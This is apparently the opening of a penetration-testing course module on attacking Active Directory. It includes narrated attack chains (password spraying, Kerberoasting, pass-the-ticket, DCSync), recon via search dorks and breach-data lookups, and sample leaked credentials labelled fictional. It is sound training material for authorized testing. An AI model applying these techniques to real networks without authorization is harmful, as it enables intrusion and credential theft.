# Introduction to Active Directory Enumeration & Attacks

* * *

## Active Directory Explained

`Active Directory` ( `AD`) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since. AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization’s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment. If this is your first time learning about Active Directory or hearing these terms, check out the [Intro To Active Directory](https://academy.hackthebox.com/catalogue) module for a more in-depth look at the structure and function of AD, AD objects, etc.

* * *

## Why Should We Care About AD?

At the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending implementations with Azure AD. Another interesting stat to consider is that just in the last two years, Microsoft has had over `2000` reported vulnerabilities tied to a [CVE](https://www.cvedetails.com/vendor/26/Microsoft.html). AD's many services and main purpose of making information easy to find and access make it a bit of a behemoth to manage and correctly harden. This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these misconfigurations and ease of access with common user and OS vulnerabilities, and you have a perfect storm for an attacker to take advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take advantage of their existence. We will practice enumerating AD utilizing native tools and languages such as `Sysinternals`, `WMI`, `DNS`, and many others. Some attacks we will also practice include `Password spraying`, `Kerberoasting`, utilizing tools such as `Responder`, `Kerbrute`, `Bloodhound`, and much more.

We may often find ourselves in a network with no clear path to a foothold through a remote exploit such as a vulnerable application or service. Yet, we are within an Active Directory environment, which can lead to a foothold in many ways. The general goal of gaining a foothold in a client's AD environment is to `escalate privileges` by moving laterally or vertically throughout the network until we accomplish the intent of the assessment. The goal can vary from client to client. It may be accessing a specific host, user's email inbox, database, or just complete domain compromise and looking for every possible path to Domain Admin level access within the testing period. Many open-source tools are available to facilitate enumerating and attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More importantly, we need to understand the "why" behind certain flaws and misconfigurations. This will make us more effective as attackers and equip us to give sound recommendations to our clients on the major issues within their environment, as well as clear and actionable remediation advice.

We need to be comfortable enumerating and attacking AD from both Windows and Linux, with a limited toolset or built-in Windows tools, also known as " `living off the land`." It is common to run into situations where our tools fail, are being blocked, or we are conducting an assessment where the client has us work from a `managed workstation` or `VDI instance` instead of the customized Linux or Windows attack host we may have grown accustomed to. To be effective in all situations, we must be able to adapt quickly on the fly, understand the many nuances of AD and know how to access them even when severely limited in our options.

* * *

## Real-World Examples

Let's look at a few scenarios to see just what is possible in a real-world AD-centric engagement:

**Scenario 1 - Waiting On An Admin**

During this engagement, I compromised a single host and gained `SYSTEM` level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were `Service Principal Names` (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the `NetNTLMv2 hash` of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.

* * *

**Scenario 2 - Spraying The Night Away**

Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) tool and retrieved both a listing of `all` users from the domain, and the domain `password policy`. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, `Password1`, Password123, `Spring2018`, etc. but did not get any hits. Finally, I made an attempt with `Spring@18` and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a `pass-the-ticket` attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.

* * *

**Scenario 3 - Fighting In The Dark**

I had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the [linkedin2username](https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the `userenum` feature of Kerbrute, ended up with **516** valid users. I knew I had to tread carefully with password spraying, so I tried with the password `Welcome2021` and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) rights over the [Enterprise Key Admins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.

* * *

## This Is The Way

These scenarios may seem overwhelming with many foreign concepts right now, but after completing this module, you will be familiar with most of them (some concepts described in these scenarios are outside the scope of this module). These show the importance of iterative enumeration, understanding our target, and adapting and thinking outside the box as we work our way through an environment. We will perform many of the parts of the attack chains described above in these module sections, and then you'll get to put your skills to the test by attacking two different AD environments at the end of this module and discovering your own attack chains. Strap in because this will be a fun, but bumpy, ride through the wild world that is `enumerating` and `attacking` Active Directory.

* * *

## Practical Examples

Throughout the module, we will cover examples with accompanying command output. Most of which can be reproduced on the target VMs that can be spawned within the relevant sections. You will be provided RDP credentials to interact with some of the target VMs to learn how to enumerate and attack from a Windows host ( `MS01`) and SSH access to a preconfigured Parrot Linux host ( `ATTACK01`) to perform enumeration and attack examples from Linux. You can connect from the Pwnbox or your own VM (after downloading a VPN key once a machine spawns) via RDP using [FreeRDP](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface), [Remmina](https://remmina.org/), or the RDP client of your choice where applicable or the SSH client built into the Pwnbox or your own VM.

* * *

#### Connecting via FreeRDP

We can connect via command line using the command:

```shell
xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!

```

#### Connecting via SSH

We can connect to the provided Parrot Linux attack host using the command, then enter the provided password when prompted.

```shell
ssh htb-student@<ATTACK01 target IP>

```

#### Xfreerdp to the ATTACK01 Parrot Host

We also installed an `XRDP` server on the `ATTACK01` host to provide GUI access to the Parrot attack host. This can be used to interact with the BloodHound GUI tool which we will cover later in this section. In sections where this host spawns (where you are given SSH access) you can also connect to it using `xfreerdp` using the same command as you would with the Windows attack host above:

```shell
xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!

```

Most sections will provide credentials for the `htb-student` user on either `MS01` or `ATTACK01`. Depending on the material and challenges, some sections will have you authenticate to a target with a different user, and alternate credentials will be provided.

Throughout the course of this module you will be presented with multiple mini Active Directory labs. Some of these labs can take 3-5 minutes to fully spawn and be accessible via RDP. We recommend scrolling to the end of each section, clicking to spawn the lab, and then start reading through the material, so the environment is up by the time you reach the interactive portions of the section.

* * *

## Toolkit

We provide a Windows and Parrot Linux attack host in the accompanying lab for this module. All tools needed to perform all examples and solve all questions throughout the module sections are present on the hosts. The tools necessary for the Windows attack host, `MS01` are located in the `C:\Tools` directory. Others, such as the Active Directory PowerShell module, will load upon opening a PowerShell console window. Tools on the Linux attack host, `ATTACK01`, are either installed and added to the `htb-student` users' PATH or present in the `/opt` directory. You can, of course, (and it is encouraged) compile (where needed) and upload your own tools and scripts to the attack hosts to get in the habit of doing so or hosting them on an SMB share from the Pwnbox working with the tools that way. Keep in mind that when performing an actual penetration test in a client's network, it is always best to compile the tools yourself to examine the code beforehand and ensure there is nothing malicious hiding in the compiled executable. We don't want to bring infected tools into a client's network and expose them to an outside attack.

* * *

Have fun, and don't forget to think outside of the box! AD is immense. You will not master it overnight, but keep working at it, and soon the content in this module will be second nature.

# Tools of the Trade

* * *

Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux, we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack host within the internal network. All necessary tools and scripts are preloaded on this host (either installed or in the `/opt` directory). Here is a listing of many of the tools that we will cover in this module:

| Tool | Description |
| --- | --- |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/ [SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound) | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed.

# Scenario

* * *

We are Penetration Testers working for `CAT-5 Security`. After a few successful engagements shadowing with the team, the more senior members want to see how well we can do starting an assessment on our own. The team lead sent us the following email detailing what we need to accomplish.

#### Tasking Email

![image](https://academy.hackthebox.com/storage/modules/143/scenario-email.png)

This module will allow us to practice our skills (both prior and newly minted) with these tasks. The final assessment for this module is the execution of `two` internal penetration tests against the company Inlanefreight. During these assessments, we will work through an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the internal network as clients often request. Completing the skills assessments signifies the successful completion of the tasks mentioned in the scoping document and tasking email above. In doing so, we will demonstrate a firm grasp of many automated and manual AD attack and enumeration concepts, knowledge of and experience with a wide array of tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in this module is meant to cover core enumeration concepts necessary for anyone to be successful in performing internal penetration tests in Active Directory environments. We will also cover many of the most common attack techniques in great depth while working through some more advanced concepts as a primer for AD-focused material that will be covered in more advanced modules.

Below you will find a completed scoping document for the engagement containing all pertinent information provided by the customer.

* * *

## Assessment Scope

The following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.

#### In Scope For Assessment

| **Range/Domain** | **Description** |
| --- | --- |
| `INLANEFREIGHT.LOCAL` | Customer domain to include AD and web services. |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain |
| `FREIGHTLOGISTICS.LOCAL` | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23` | In-scope internal subnet. |
|  |  |

#### Out Of Scope

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

* * *

## Methods Used

The following methods are authorized for assessing Inlanefreight and its systems :

### External Information Gathering (Passive Checks)

External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors will conduct external information gathering from an anonymous perspective on the internet with no information provided in advance regarding Inlanefreight outside of what is provided within this document.

Cat-5 will perform passive enumeration to uncover information that may help with internal testing. Testing will employ various degrees of information gathering from open-source resources to identify publicly accessible data that may pose a risk to Inlanefreight and assist with the internal penetration test. No active enumeration, port scans, or attacks will be performed against internet-facing "real-world" IP addresses or the website located at `https://www.inlanefreight.com`.

### Internal Testing

The internal assessment portion is designed to demonstrate the risks associated with vulnerabilities on internal hosts and services ( `Active Directory specifically`) by attempting to emulate attack vectors from within Inlanefreight's area of operations. The result will allow Inlanefreight to assess the risks of internal vulnerabilities and the potential impact of a successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment from an untrusted insider perspective with no advance information outside of what's provided in this documentation and discovered from external testing. Testing will start from an anonymous position on the internal network with the goal of obtaining domain user credentials, enumerating the internal domain, gaining a foothold, and moving laterally and vertically to achieve compromise of all in-scope internal domains. Computer systems and network operations will not be intentionally interrupted during the test.

### Password Testing

Password files captured from Inlanefreight devices, or provided by the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment goals. At no time will a captured password file or the decrypted passwords be revealed to persons not officially participating in the assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official contract between Cat-5 and Inlanefreight.

* * *

We provided the above scoping documentation so we become used to seeing this style of documentation. As we progress through our Infosec Careers, especially on the offensive side, it will be common to receive scoping documents and Rules of Engagement (RoE) documents that outline these types of information.

* * *

## The Stage Is Set

Now that we have our scope clearly defined for this module, we can dive into exploring Active Directory enumeration and attack vectors. Now, let's dive into performing passive external enumeration against Inlanefreight.


# External Recon and Enumeration Principles

* * *

Before kicking off any pentest, it can be beneficial to perform `external reconnaissance` of your target. This can serve many different functions, such as:

- Validating information provided to you in the scoping document from the client
- Ensuring you are taking actions against the appropriate scope when working remotely
- Looking for any information that is publicly accessible that can affect the outcome of your test, such as leaked credentials

Think of it like this; we are trying to get the `lay of the land` to ensure we provide the most comprehensive test possible for our customer. That also means identifying any potential information leaks and breach data out in the world. This can be as simple as gleaning a username format from the customer's main website or social media. We may also dive as deep as scanning GitHub repositories for credentials left in code pushes, hunting in documents for links to an intranet or remotely accessible sites, and just looking for any information that can key us in on how the enterprise environment is configured.

* * *

## What Are We Looking For?

When conducting our external reconnaissance, there are several key items that we should be looking for. This information may not always be publicly accessible, but it would be prudent to see what is out there. If we get stuck during a penetration test, looking back at what could be obtained through passive recon can give us that nudge needed to move forward, such as password breach data that could be used to access a VPN or other externally facing service. The table below highlights the " `What`" in what we would be searching for during this phase of our engagement.

| **Data Point** | **Description** |
| --- | --- |
| `IP Space` | Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc. |
| `Domain Information` | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.) |
| `Schema Format` | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc. |
| `Data Disclosures` | For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain `intranet` site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) |
| `Breach Data` | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold. |

We have addressed the `why` and `what` of external reconnaissance; let's dive into the `where` and `how`.

* * *

## Where Are We Looking?

Our list of data points above can be gathered in many different ways. There are many different websites and tools that can provide us with some or all of the information above that we could use to obtain information vital to our assessment. The table below lists a few potential resources and examples that can be used.

| **Resource** | **Examples** |
| --- | --- |
| `ASN / IP registrars` | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/) |
| `Domain Registrars & DNS` | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as `8.8.8.8`. |
| `Social Media` | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization. |
| `Public-Facing Company Websites` | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines. |
| `Cloud & Dev Storage Spaces` | [GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database) |
| `Breach Data Sources` | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |

### Finding Address Spaces

![image](https://academy.hackthebox.com/storage/modules/143/bgp-toolkit.png)

The `BGP-Toolkit` hosted by [Hurricane Electric](http://he.net/) is a fantastic resource for researching what address blocks are assigned to an organization and what ASN they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can. We can glean a lot from this info. Many large corporations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. This will typically not be the case for smaller organizations or fledgling companies. As you research, keep this in mind since smaller organizations will often host their websites and other infrastructure in someone else's space (Cloudflare, Google Cloud, AWS, or Azure, for example). Understanding where that infrastructure resides is extremely important for our testing. We have to ensure we are not interacting with infrastructure out of our scope. If we are not careful while pentesting against a smaller organization, we could end up inadvertently causing harm to another organization sharing that infrastructure. You have an agreement to test with the customer, not with others on the same server or with the provider. Questions around self-hosted or 3rd party managed infrastructure should be handled during the scoping process and be clearly listed in any scoping documents you receive.

In some cases, your client may need to get written approval from a third-party hosting provider before you can test. Others, such as AWS, have specific [guidelines](https://aws.amazon.com/security/penetration-testing/) for performing penetration tests and do not require prior approval for testing some of their services. Others, such as Oracle, ask you to submit a [Cloud Security Testing Notification](https://docs.oracle.com/en-us/iaas/Content/Security/Concepts/security_testing-policy_notification.htm). These types of steps should be handled by your company management, legal team, contracts team, etc. If you are in doubt, escalate before attacking any external-facing services you are unsure of during an assessment. It is our responsibility to ensure that we have explicit permission to attack any hosts (both internal and external), and stopping and clarifying the scope in writing never hurts.

### DNS

DNS is a great way to validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like [domaintools](https://whois.domaintools.com/), and [viewdns.info](https://viewdns.info/) are great spots to start. We can get back many records and other data ranging from DNS resolution to testing for DNSSEC and if the site is accessible in more restricted countries. Sometimes we may find additional hosts out of scope, but look interesting. In that case, we could bring this list to our client to see if any of them should indeed be included in the scope. We may also find interesting subdomains that were not listed in the scoping documents, but reside on in-scope IP addresses and therefore are fair game.

#### Viewdns.info

![image](https://academy.hackthebox.com/storage/modules/143/viewdnsinfo.png)

This is also a great way to validate some of the data found from our IP/ASN searches. Not all information about the domain found will be current, and running checks that can validate what we see is always good practice.

### Public Data

Social media can be a treasure trove of interesting data that can clue us in to how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. On top of that list are job-related sites like LinkedIn, Indeed.com, and Glassdoor. Simple job postings often reveal a lot about a company. For example, take a look at the job listing below. It's for a `SharePoint Administrator` and can key us in on many things. We can tell from the listing that the company has been using SharePoint for a while and has a mature program since they are talking about security programs, backup & disaster recovery, and more. What is interesting to us in this posting is that we can see the company likely uses SharePoint 2013 and SharePoint 2016. That means they may have upgraded in place, potentially leaving vulnerabilities in play that may not exist in newer versions. This also means we may run into different versions of SharePoint during our engagements.

### Sharepoint Admin Job Listing

![image](https://academy.hackthebox.com/storage/modules/143/spjob2.png)

Don't discount public information such as job postings or social media. You can learn a lot about an organization just from what they post, and a well-intentioned post could disclose data relative to us as penetration testers.

Websites hosted by the organization are also great places to dig for information. We can gather contact emails, phone numbers, organizational charts, published documents, etc. These sites, specifically the embedded documents, can often have links to internal infrastructure or intranet sites that you would not otherwise know about. Checking any publicly accessible information for those types of details can be quick wins when trying to formulate a picture of the domain structure. With the growing use of sites such as GitHub, AWS cloud storage, and other web-hosted platforms, data can also be leaked unintentionally. For example, a dev working on a project may accidentally leave some credentials or notes hardcoded into a code release. If you know where to look for that data, it can give you an easy win. It could mean the difference between having to password spray and brute-force credentials for hours or days or gaining a quick foothold with developer credentials, which may also have elevated permissions. Tools like [Trufflehog](https://github.com/trufflesecurity/truffleHog) and sites like [Greyhat Warfare](https://buckets.grayhatwarfare.com/) are fantastic resources for finding these breadcrumbs.

We have spent some time discussing external enumeration and recon of an organization, but this is just one piece of the puzzle. For a more detailed introduction to OSINT and external enumeration, check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) and [OSINT:Corporate Recon](https://academy.hackthebox.com/course/preview/osint-corporate-recon) modules.

Up to this point, we have been mostly passive in our discussions. As you move forward into the pentest, you will become more hands-on, validating the information you have found and probing the domain for more information. Let's take a minute to discuss enumeration principles and how we can put a process in place to perform these actions.

* * *

## Overarching Enumeration Principles

Keeping in mind that our goal is to understand our target better, we are looking for every possible avenue we can find that will provide us with a potential route to the inside. Enumeration itself is an iterative process we will repeat several times throughout a penetration test. Besides the customer's scoping document, this is our primary source of information, so we want to ensure we are leaving no stone unturned. When starting our enumeration, we will first use `passive` resources, starting wide in scope and narrowing down. Once we exhaust our initial run of passive enumeration, we will need to examine the results and then move into our active enumeration phase.

* * *

## Example Enumeration Process

We have already covered quite a few concepts pertaining to enumeration. Let's start putting it all together. We will practice our enumeration tactics on the `inlanefreight.com` domain without performing any heavy scans (such as Nmap or vulnerability scans which are out of scope). We will start first by checking our Netblocks data and seeing what we can find.

#### Check for ASN/IP & Domain Data

![image](https://academy.hackthebox.com/storage/modules/143/BGPhe-inlane.png)

From this first look, we have already gleaned some interesting info. BGP.he is reporting:

- IP Address: 134.209.24.248
- Mail Server: mail1.inlanefreight.com
- Nameservers: NS1.inlanefreight.com & NS2.inlanefreight.com

For now, this is what we care about from its output. Inlanefreight is not a large corporation, so we didn't expect to find that it had its own ASN. Now let's validate some of this information.

#### Viewdns Results

![image](https://academy.hackthebox.com/storage/modules/143/viewdns-results.png)

In the request above, we utilized `viewdns.info` to validate the IP address of our target. Both results match, which is a good sign. Now let's try another route to validate the two nameservers in our results.

```shell
nslookup ns1.inlanefreight.com

Server:		192.168.186.1
Address:	192.168.186.1#53

Non-authoritative answer:
Name:	ns1.inlanefreight.com
Address: 178.128.39.165

nslookup ns2.inlanefreight.com
Server:		192.168.86.1
Address:	192.168.86.1#53

Non-authoritative answer:
Name:	ns2.inlanefreight.com
Address: 206.189.119.186

```

We now have `two` new IP addresses to add to our list for validation and testing. Before taking any further action with them, ensure they are in-scope for your test. For our purposes, the actual IP addresses would not be in scope for scanning, but we could passively browse any websites to hunt for interesting data. For now, that is it with enumerating domain information from DNS. Let's take a look at the publicly available information.

Inlanefreight is a fictitious company that we are using for this module, so there is no real social media presence. However, we would check sites like LinkedIn, Twitter, Instagram, and Facebook for helpful info if it were real. Instead, we will move on to examining the website `inlanefreight.com`.

The first check we ran was looking for any documents. Using `filetype:pdf inurl:inlanefreight.com` as a search, we are looking for PDFs.

#### Hunting For Files

![image](https://academy.hackthebox.com/storage/modules/143/google-dorks.png)

One document popped up, so we need to ensure we note the document and its location and download a copy locally to dig through. It is always best to save files, screenshots, scan output, tool output, etc., as soon as we come across them or generate them. This helps us keep as comprehensive a record as possible and not risk forgetting where we saw something or losing critical data. Next, let's look for any email addresses we can find.

#### Hunting E-mail Addresses

![image](https://academy.hackthebox.com/storage/modules/143/intext-dork.png)

Using the dork `intext:"@inlanefreight.com" inurl:inlanefreight.com`, we are looking for any instance that appears similar to the end of an email address on the website. One promising result came up with a contact page. When we look at the page (pictured below), we can see a large list of employees and contact info for them. This information can be helpful since we can determine that these people are at least most likely active and still working with the company.

#### E-mail Dork Results

Browsing the [contact page](https://www.inlanefreight.com/index.php/contact/), we can see several emails for staff in different offices around the globe. We now have an idea of their email naming convention (first.last) and where some people work in the organization. This could be handy in later password spraying attacks or if social engineering/phishing were part of our engagement scope.

![image](https://academy.hackthebox.com/storage/modules/143/ilfreightemails.png)

#### Username Harvesting

We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

#### Credential Hunting

[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.

Note: For our purposes, the sample data below is fictional.

```shell
sudo python3 dehashed.py -q inlanefreight.local -p

id : 5996447501
email : [email protected]
username : rgrimes
password : Ilovefishing!
hashed_password :
name : Roger Grimes
vin :
address :
phone :
database_name : ModBSolutions

id : 7344467234
email : [email protected]
username : jyu
password : Starlight1982_!
hashed_password :
name : Jane Yu
vin :
address :
phone :
database_name : MyFitnessPal

<SNIP>

```

Now that we have a hang of this try your hand at searching for other results related to the inlanefreight.com domain. What can you find? Are there any other useful files, pages, or information embedded on the site? This section demonstrated the importance of thoroughly analyzing our target, provided that we stay in scope and do not test anything we are not authorized to and stay within the time constraints of the engagement. I have had quite a few assessments where I was having trouble gaining a foothold from an anonymous standpoint on the internal network and resorted to creating a wordlist using varying outside sources (Google, LinkedIn scraping, Dehashed, etc.) and then performed targeted internal password spraying to get valid credentials for a standard domain user account. As we will see in the following sections, we can perform the vast majority of our internal AD enumeration with just a set of low-privilege domain user credentials and even many attacks. The fun starts once we have a set of credentials. Let's move into internal enumeration and begin analyzing the internal `INLANEFREIGHT.LOCAL` domain passively and actively per our assessment's scope and rules of engagement.


# Initial Enumeration of the Domain

* * *

We are at the very beginning of our AD-focused penetration test against Inlanefreight. We have done some basic information gathering and gotten a picture of what to expect from the customer via the scoping documents.

* * *

## Setting Up

For this first portion of the test, we are starting on an attack host placed inside the network for us. This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:

- A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.
- A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.
- A physical presence at their office with our laptop plugged into an ethernet port.
- A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.
- VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).
- From a corporate laptop connected to the client's VPN.
- On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.
- On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.

These are the most common setups I have seen, though a client may come up with another variation of one of these. The client may also choose from a "grey box" approach where they give us just a list of in-scope IP addresses/CIDR network ranges, or "black box" where we have to plug in and do all discovery blindly using various techniques. Finally, they can choose either evasive, non-evasive, or hybrid evasive (starting "quiet" and slowly getting louder to see what threshold we are detected at and then switching to non-evasive testing. They may also elect to have us start with no credentials or from the perspective of a standard domain user.

Our customer Inlanefreight has chosen the following approach because they are looking for as comprehensive an assessment as possible. At this time, their security program is not mature enough to benefit from any form of evasive testing or a "black box" approach.

- A custom pentest VM within their internal network that calls back to our jump host, and we can SSH into it to perform testing.
- They've also given us a Windows host that we can load tools onto if need be.
- They've asked us to start from an unauthenticated standpoint but have also given us a standard domain user account ( `htb-student`) which can be used to access the Windows attack host.
- "Grey box" testing. They have given us the network range 172.16.5.0/23 and no other information about the network.
- Non-evasive testing.

We have not been provided credentials or a detailed internal network map.

* * *

## Tasks

Our tasks to accomplish for this section are:

- Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
- This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
- Document any findings we come across for later use. Extremely important!

We will start from our Linux attack host without domain user credentials. It's a common thing to start a pentest off in this manner. Many organizations will wish to see what you can do from a blind perspective, such as this, before providing you with further information for the test. It gives a more realistic look at what potential avenues an adversary would have to use to infiltrate the domain. It can help them see what an attacker could do if they gain unauthorized access via the internet (i.e., a phishing attack), physical access to the building, wireless access from outside (if the wireless network touches the AD environment), or even a rogue employee. Depending on the success of this phase, the customer may provide us with access to a domain-joined host or a set of credentials for the network to expedite testing and allow us to cover as much ground as possible.

Below are some of the key data points that we should be looking for at this time and noting down into our notetaking tool of choice and saving scan/tool output to files whenever possible.

#### Key Data Points

| **Data Point** | **Description** |
| --- | --- |
| `AD Users` | We are trying to enumerate valid user accounts we can target for password spraying. |
| `AD Joined Computers` | Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc. |
| `Key Services` | Kerberos, NetBIOS, LDAP, DNS |
| `Vulnerable Hosts and Services` | Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold) |

* * *

